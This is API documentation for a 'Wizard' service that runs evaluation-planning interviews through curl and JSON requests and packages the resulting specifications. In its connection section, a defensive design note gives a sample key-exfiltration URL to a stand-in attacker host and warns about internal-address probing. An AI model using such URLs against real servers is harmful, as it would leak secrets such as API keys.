# Use the Wizard HTTP API

The Wizard API runs the same Interview as the [web client](web.md). Use it to add evaluation
planning to another application or workflow. See the [Wizard overview](../wizard.md) for the
evaluation terms.

All routes start with `/api/v1/wizard`. Open `http://localhost:8001/docs` for the complete OpenAPI
schemas and named examples.

## Before you start

Install and start the API from the repository root:

```bash
make install-api
cp .env.example .env
make run-api
```

Set `OPENAI_API_KEY` in `.env`, and `OPENAI_BASE_URL` when you do not use the default OpenAI
endpoint. See the [model guide](../models.md) for the variables of each role. The API starts when a
setting is missing. `GET /api/v1/models` returns the model name, its source, and the configured
status of each role, never a key or a URL. Until the interview role is configured, the Interview routes return
503 `model_unavailable`. The interview role also matches each Criterion to a library grader. The examples use `http://localhost:8001` and require `curl`
and `jq`.

The API is stateless. Your client owns the Interview state.

| Client rule | Required action |
|---|---|
| Save progress | Save the complete `state` from each successful lifecycle response. |
| Send progress | Send that state unchanged with the next `/turn` or `/end` request. |
| Read progress | Check `outcome` after every `/start`, `/turn`, or `/end` response. |
| Prevent stale answers | Use the `request_id` from the latest `state.pending` screen. |
| Keep files | Store original documents until packaging is complete. State contains no file bytes. |

The examples keep the latest successful response in `interview.json`. This is the only saved
Interview file.

```text
config and optional document extraction
                    │
                    ▼
                  start
                    │
                    ▼
                  turn ◄──────────────────────┐
                    │                         │
                    ├─ awaiting_response ─────┘
                    ├─ done ────────────────► compile or package
                    └─ optional end ─────────► awaiting_response or done
```

### Read client configuration

`GET /config` returns the opening copy, Perspectives, ARC capabilities, and document limits.

```bash
curl --fail-with-body http://localhost:8001/api/v1/wizard/config
```

Use the returned IDs in the start request. An empty capability selection is valid.

### Extract document text

`POST /documents/extract` is optional. Call it before `/interview/start`.

```bash
curl --fail-with-body http://localhost:8001/api/v1/wizard/documents/extract \
  -F 'files=@policy.pdf'
```

The response contains a `documents` list with canonical file names and extracted text. The route
supports UTF-8 TXT, Markdown, YAML, JSON, CSV, PDF text layers, and DOCX files. It does not run OCR. Add the returned
list to the start request. The opening document list cannot change after start.

Keep each original file. If a Scenario uses it, send the original bytes to `/package`.

## Review controls

A Choice request carries `sections`. Each `ReviewSection` has an `id`, a finished `title`, a
`parent`, and `options`. A section with `parent: null` is a Profile section heading, and its `id`
is a Profile section ID (`behaviours`, `personas`, `scenarios`, or `test-cases`). A section with a
`parent` is a group heading inside it, such as a Feature. A section with no cards still shows its
options. Each card has `profile_section_id`, which tells which Profile section holds it, and
`section_id`, which names its group heading. `profile_section_id` on the request identifies the
active review. Nested `details` components contain expandable content. `muted: true` on a component
marks supporting detail, such as Grader settings. Table `columns` contain finished cell text.
Render supplied controls and preserve their IDs.

Review options use one action set. The `target` of each option is an ID, and the package finds what
the ID names:

| `action` | `target` | Result |
|---|---|---|
| `add` | A parent ID, or `features`, `personas`, `scenarios`, `tasks` | Opens a typed form for a new child |
| `edit` | An item ID | Opens a typed form with the current values |
| `remove` | An item ID | Removes the item and its dependants |
| `tick`, `cover` | An item ID | Applies the patch on the option |
| `back`, `continue` | None | Moves between steps |

`Option.hint` is finished supporting text for a short label, such as a Behaviour description for
the chip `EB-1`. `Card.show_id` is false when the item ID only repeats the name, as on Persona and
Scenario cards. `Option.icon` is `pencil`, `plus`, `trash`, or null. `Option.label` is complete text, such as
"Delete Answer quality". Show it as the tooltip or in place of the icon. When `Option.confirm` is
set, show its text and send the option only after the user confirms. A card has a checkbox
(`selected` is not null) only when one of its options toggles it.

A Choice request with `feedback_placeholder` accepts `{"type": "choice", "feedback": "..."}`.
Send this with the pending request ID. Feedback cannot accompany selections or field values.
Corrections apply in one turn. Keep the review visible while the response is pending. A
correction from feedback can also set a Behaviour's `measured` flag and a Task's `num_trials`.

A Form request has prefilled `fields[].value` and a finished `submit_label`. An edit form has
`purpose: "edit"`. Save uses the submitted text. Only a field with `required: true` must be
nonblank. A rejected required field keeps the pending form unchanged for correction. A field with
`choices` is a dropdown: show each `FormChoice.label` and send its `value`. A field with
`multiple: true` takes several choices; send the values as one comma-separated text.
`FormField.column` names the table column of the cell that the field edits, so a door can edit a
row in place.
`used_combinations` lists value sets that other items use, such as
`{"persona": "P-1", "scenario": "S-1"}`. Disable a choice that would complete one. The package
checks again and keeps the form open with a warning when a pair is in use.

A Form request with `cancellable: true` accepts a normal turn with response
`{"type": "form", "cancelled": true, "values": {}}`. Use the pending request ID. Cancellation returns
to review without changing the Specification. Cancellation with nonempty values is rejected.

A Test Case row is a `ScenarioCard`. Its `selected` value is true when the Test Case is included
in the evaluation, and its `tick` option changes that. The selection is in
`InterviewState.excluded_tasks`. Readiness, the totals, and `/package` use only the selected
Test Cases. A Scenario that no selected Test Case uses is left out of the package.

Back is accepted while a Form request is pending at any step after Clarify. Send
`{"type": "choice", "selected": ["back"]}` with the form's request ID. The form closes with no
change, and the step before opens. A completed Interview has no pending request. Send the same
Back response with `request_id: ""` to reopen the Test Case review. This clears `confirmed`, and
Continue completes the Interview again.

## Start an Interview

`POST /interview/start` creates the first state and pending screen.

| Request field | Required | Description |
|---|---|---|
| `description` | Yes | Description of the target. |
| `known_capability_ids` | No | Capability IDs from `/config`. The list can be empty. |
| `capability_confidence` | No | `low`, `medium`, or `high`. |
| `perspective` | No | Defaults to `end_user`; other values come from `/config`. |
| `documents` | No | Output from `/documents/extract`, or document names without text. |

Supply `known_capability_ids` and `capability_confidence` together, or omit both. Both can also
be null. Omitted evidence is stored as `state.context.capability_evidence: null`. It means
unspecified. It does not mean an empty selection or low confidence. IDs and confidence are
validated when supplied. Perspective and supplied capability context guide each model call.

A minimal start request is `{"description": "A research assistant that cites its sources."}`.

Example request:

```json
{
  "description": "A research assistant that answers policy questions and cites its sources.",
  "perspective": "end_user",
  "known_capability_ids": [],
  "capability_confidence": "low",
  "documents": []
}
```

A successful response contains these control fields:

| Response field | Description |
|---|---|
| `type` | `success`. |
| `state` | Complete client-held Interview state. |
| `state.pending` | The screen that needs an answer. |
| `stage` | Current Interview stage. |
| `missing` | Structured gaps that stop completion. |
| `outcome` | `awaiting_response` or `done`. |

Save the successful response as `interview.json`:

```bash
if response=$(curl --fail-with-body http://localhost:8001/api/v1/wizard/interview/start \
  -H 'Content-Type: application/json' \
  --data '{
    "description": "A research assistant that answers policy questions and cites its sources.",
    "perspective": "end_user",
    "known_capability_ids": [],
    "capability_confidence": "low"
  }') &&
  printf '%s\n' "$response" | jq -e '.type == "success"' > /dev/null; then
  printf '%s\n' "$response" > interview.json
else
  printf '%s\n' "$response"
fi
```

Do not rebuild state from the visible Specification or from an abbreviated response example.

## Answer a turn

`POST /interview/turn` answers `state.pending`. Repeat it while `outcome` is
`awaiting_response`.

| Request field | Description |
|---|---|
| `state` | Complete `state` from `interview.json`. |
| `request_id` | Exact ID from `state.pending.request_id`. |
| `response` | Typed answer that matches `state.pending.type`. |

Read the next screen with:

```bash
jq '{outcome, pending: .state.pending}' interview.json
```

### Chat

For `pending.type: "chat"`, send text:

```json
{
  "type": "chat",
  "text": "Policy analysts use it to compare new guidance with existing policy."
}
```

### Choice

For `pending.type: "choice"`, send offered option IDs:

```json
{
  "type": "choice",
  "selected": ["continue"]
}
```

Options can occur in `pending.options`, warnings, cards, or card components. Form an option ID by
joining its non-empty `action`, `target`, and `via` values with colons. For example,
`{"action":"cover","target":"S-1","via":"EB-2"}` becomes `cover:S-1:EB-2`.

Send only enabled options from the current screen. Multiple selections are valid when
`pending.multi` is true.

Choice screens can also contain number or file-list fields. Use the field ID as a key in `values`:

```json
{
  "type": "choice",
  "values": {
    "trials:S-1": 5,
    "files:S-1": ["policy.pdf"]
  }
}
```

### Form

For `pending.type: "form"`, use the exact field IDs from `pending.fields`:

```json
{
  "type": "form",
  "values": {
    "target_name": "Policy assistant"
  }
}
```

### Submit the turn

Set `answer` to one of the response objects above. Build the turn request from
`interview.json`, then save the successful result back to the same file:

```bash
answer='{"type":"chat","text":"Policy analysts compare new guidance."}'
request=$(jq -c --argjson answer "$answer" \
  '{state: .state, request_id: .state.pending.request_id, response: $answer}' \
  interview.json)

if response=$(curl --fail-with-body http://localhost:8001/api/v1/wizard/interview/turn \
  -H 'Content-Type: application/json' \
  --data-binary "$request") &&
  printf '%s\n' "$response" | jq -e '.type == "success"' > /dev/null; then
  printf '%s\n' "$response" > interview.json
else
  printf '%s\n' "$response"
fi
```

Read the new pending screen before the next answer. The request ID, response type, and offered
options can change after every turn.

## Finish and create the output

A normal final `/interview/turn` can return `outcome: "done"`. You can then compile or package the
Specification.

### Finish early

`POST /interview/end` asks the Wizard to complete the remaining work and validate the Specification. It
is optional.

Send the complete saved state from `interview.json`, then save the successful result back to the
same file:

```bash
request=$(jq -c '{state: .state}' interview.json)

if response=$(curl --fail-with-body http://localhost:8001/api/v1/wizard/interview/end \
  -H 'Content-Type: application/json' \
  --data-binary "$request") &&
  printf '%s\n' "$response" | jq -e '.type == "success"' > /dev/null; then
  printf '%s\n' "$response" > interview.json
else
  printf '%s\n' "$response"
fi
```

A successful response has two possible outcomes:

| Outcome | Next action |
|---|---|
| `awaiting_response` | Save the returned state and continue with `/interview/turn`. |
| `done` | Compile `state.specification` or package the full `state`. |

HTTP 200 confirms that the operation succeeded. Check `outcome` to learn whether the Interview is
complete. If the Wizard cannot complete the Interview, the API returns HTTP 400 with the code
`completion_failed`. See [Handle errors and resume](#handle-errors-and-resume).

### Compile or package

Use either endpoint after `/turn` or `/end` returns `done`.

| Endpoint | Input | Output | Use |
|---|---|---|---|
| `POST /compile` | `state.specification` as JSON | `specification.yaml` as a string and `specification` with assigned Task IDs | Store or display YAML yourself. |
| `POST /package` | One JSON form field: `state` for Interviews or `specification` for manual exports; an optional `connection` with `specification`; fixture file parts | `YYYYMMDD-HHMMSS-interview.zip` | Download a portable specification. |

Compile directly from `interview.json`:

```bash
jq '.state.specification' interview.json | \
  curl --fail-with-body http://localhost:8001/api/v1/wizard/compile \
    -H 'Content-Type: application/json' \
    --data-binary @-
```

Package directly from `interview.json`:

```bash
jq -c '.state' interview.json | \
  curl --fail-with-body http://localhost:8001/api/v1/wizard/package \
    -F 'state=<-' \
    --remote-name --remote-header-name
```

Add one `-F 'files=@<path>'` part for each original fixture referenced by the completed Specification.
The response `Content-Disposition` header supplies the ZIP filename. The ZIP contains a
`YYYYMMDD-HHMMSS-interview/` root folder with `inputs/interview_state.json`, `outputs/specification.yaml`, and
`outputs/fixtures/`. In run mode, it also contains `outputs/target-binding.yaml`. The API compiles the Specification directly from the supplied state and
saves that same state with its current JSON format. Send exactly one source field; requests
with both `state` and `specification` are rejected.

For a manual export, send the user-authored Specification in the `specification` form field.
The manual ZIP uses `YYYYMMDD-HHMMSS-manual.zip` and a matching root folder. It contains an
empty `inputs/` folder and the same `outputs/` layout.

To run a manual export, also send a `connection` form field. Its value is a connection as JSON,
in the same shape as `state.context.connection`. The ZIP then contains
`outputs/target-binding.yaml`, and `outputs/specification.yaml` names the generic runner and the
binding file. This is the same export as an Interview with that connection. The API applies the
same validation as `POST /connection/check`. A binding that is not valid gives a 400
`validation_error`. Its message names each field and its reason, and never the value. Send
`connection` only with `specification`. An Interview keeps its connection in its state, so a
request with `state` and `connection` gives a 400 `validation_error`.

```bash
curl --fail-with-body http://localhost:8001/api/v1/wizard/package \
  -F 'specification=<specification.json' \
  -F 'connection=<connection.json' \
  -F 'files=@policy.pdf' \
  --remote-name --remote-header-name
```

The API retains no uploaded bytes or experiment files. A successful package response contains
a generated Specification and marks a completed export. Extract the archive into `experiments/design/`
and use its dated folder as the Engine input. For example, run
`metis engine run --input-dir experiments/design/20261016-223045-interview/outputs/`. Task fixture references stay relative
to `outputs/fixtures/`. Wizard exports contain no Testbed caches or score files.

## Connect the target

A target binding tells the Engine how to reach the target. See
[Connect the target](../wizard.md#connect-the-target) for the fields and the rules. Each secret
field takes the name of an environment variable, never its value.

| Endpoint | Body | Response |
|---|---|---|
| `POST /connection/check` | `{"binding": {...}}` | `binding` (the valid binding, or `null`), `errors` as `loc` and `msg` only, `live`, `probes`, and `status` |
| `POST /connection` | `{"state": ..., "connection": ... or null}` | The state with the connection set or removed |

A binding that is not valid gives a 200 response with `errors`. No error repeats the value that
was rejected. A request with the wrong shape gives a 422 response. Its message names each field
and its reason, and never the input.

An API that listens on `127.0.0.1`, `localhost`, or `::1` runs for one user, so it also reports
each named variable as set or not set in its own environment, fetches the OpenAPI document or
loads the start page, and checks that the API server answers. Any other API only validates the
binding: `live` is `false` and `status` is `unchecked`, because a server that fetches any URL that
a client sends is a risk. `METIS_API_CONNECTION_CHECK=1` or `0` overrides this.

The API never puts a value from its own environment into a URL that it requests. Otherwise a
client could send `https://attacker.example/${OPENAI_API_KEY}` and receive the server's key. A
`spec_url` or `start_url` that names a `${NAME}` variable is not requested: its probe says so, and
`status` is `unchecked`. To check that URL, run `metis wizard connect` on the computer that has
the variables.

The live check still sends requests to any other URL that a client gives, including an internal
address that only the API host can reach. Set `METIS_API_CONNECTION_CHECK=1` on a shared server
only when that is acceptable.

Check a binding:

```bash
curl --fail-with-body http://localhost:8001/api/v1/wizard/connection/check \
  -H 'Content-Type: application/json' \
  -d '{"binding": {"schema_version": 1, "identity": {"name": "Policy assistant"},
       "transport": "http", "spec_url": "${APP_URL}/openapi.json",
       "auth": {"secret_env": "APP_KEY"}}}'
```

To start in run mode, put a connection in the start request:

```json
{
  "description": "A research assistant for policy analysts.",
  "known_capability_ids": [],
  "capability_confidence": "medium",
  "connection": {
    "transport": "http",
    "binding": {"schema_version": 1, "identity": {"name": "Policy assistant"},
                "transport": "http", "spec_url": "${APP_URL}/openapi.json"},
    "status": "unchecked"
  }
}
```

The connection travels in `state.context.connection`. Prompts and the model never read it. A
spec-only state has no `connection` key. To add or replace the connection later, send the state
to `POST /connection` and save the returned state. `POST /package` then adds
`outputs/target-binding.yaml`, and `outputs/specification.yaml` names the generic runner and the
binding file.

## Handle errors and resume

All failures contain `type`, `code`, `message`, and `retryable`. Interview failures can also contain
a safe `state` and `missing` entries.

| HTTP status | Code | Client action |
|---|---|---|
| 400 | `request_id_mismatch` | Reload the latest pending screen and prepare its answer again. |
| 400 | `response_type_mismatch`, `response_not_offered` | Match the current screen type and offered IDs. |
| 400 | `no_pending_request` | Check `outcome`; a complete Interview can be compiled or packaged. |
| 400 or 422 | `validation_error` | Correct the request fields or types. |
| 400 | `completion_failed` | Read `missing` and continue the Interview. |
| 400 | `compilation_failed` | Supply a runnable Specification and all referenced fixture files. |
| 400 | Document error codes | Correct the file type, content, count, or size using limits from `/config`. |
| 503 | `model_unavailable` | Keep saved state and retry when `retryable` is true. |
| 500 | `internal_error` | Keep saved state and inspect the API logs. |

Write only successful lifecycle responses to `interview.json`. If a request fails, keep the last
successful file. Use a returned safe state to prepare the corrected request.

To resume, load `interview.json`, check `outcome`, and read `state.pending`. The API needs no
server-side Interview ID. Process one request at a time. Keep a separate display transcript when
you need the complete conversation; Interview state contains only recent history.

Keep the `specification` returned by `/compile` when the request contains new Tasks
with blank IDs. Submit that Specification on later edits and to `/package`. Task IDs
are assigned by the backend. Keep them when editing a Task. A Task is unique by its Persona and
Scenario pair. `specification.yaml` is the only YAML file in the archive.
